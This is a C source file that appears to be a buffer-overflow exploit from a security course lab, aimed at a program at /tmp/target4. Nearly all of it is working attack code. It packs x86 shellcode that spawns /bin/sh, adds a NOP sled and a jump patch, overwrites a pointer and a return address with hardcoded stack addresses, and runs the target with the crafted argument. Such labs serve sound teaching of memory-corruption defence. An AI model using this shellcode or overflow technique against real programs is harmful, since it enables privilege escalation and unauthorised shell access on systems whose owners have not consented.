#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[250];
  // I added 8 bytes to the shell code so that what is executed is nop, nop, jmp $+4 (jmp to the real shell code).
  char sh[] = "\x90\x90\xeb\x04\xff\xff\xff\xff\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
  int i = 0;
  // fills our buffer with the shell code and meaningless nops
  for (i; i < 96; i++){
  	if(i < sizeof(sh) - 1)
		buf[i] = sh[i];
	else
  		buf[i] = '\x90';
  }
  char sloc[4] = "\xf4\xfe\xff\xbf";
  strcpy(&buf[i], sloc); // location of shell code in memory.
  i += 4;
  char rtn[4] = "\x7c\xfd\xff\xbf";
  strcpy(&buf[i], rtn); // return address location
  i += 4;
  // fills the rest of the buffer. Not really nessesary.
  for (i; i < 250; i++){
  	buf[i] = '\x90';
  }
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}